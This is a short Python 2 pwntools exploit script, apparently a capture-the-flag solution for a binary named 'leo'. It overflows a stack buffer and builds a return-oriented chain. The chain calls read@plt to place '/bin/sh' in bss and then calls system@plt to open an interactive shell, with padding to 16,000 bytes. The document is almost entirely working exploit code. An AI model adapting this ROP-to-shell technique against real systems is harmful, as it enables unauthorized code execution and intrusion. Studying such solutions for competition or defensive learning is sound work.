#-*- coding:utf-8 -*-
from pwn import *
#r = remote('leo_33e299c29ed3f0113f3955a4c6b08500.quals.shallweplayaga.me', '61111')
r = process('./leo')
print pidof(r)

paylod = ''
paylod += p32(8001) * 7 # [rbp - 0x20] ~ [rbp - 0x8]
paylod += p32(0x1c) 	# [rbp - 0x4]
paylod += p64(0x0) # rbp, 아무거나 
paylod += p64(0x402703) # pop rdi ret
paylod += p64(0) #fd
paylod += p64(0x402701) # pop rsi pop r15 ret
paylod += p64(0x0604188) # bss
paylod += p64(0xaaaaaaaa) # junk
paylod += p64(0x401090) # read@plt
paylod += p64(0x402703) # pop rdi ret
paylod += p64(0x0604188) # bss
paylod += p64(0x0400FD0) # system@plt


# for "This doesn't match my patterns.  Checking..." just padding
paylod += chr(255) * 620

for i in range(0, 254):
	paylod += chr(i) * 60

paylod += chr(254) * (16000 - len(paylod)) # for 16,000bytes

print len(paylod)

r.send(paylod)
r.send("/bin/sh\x00\n")

r.interactive()
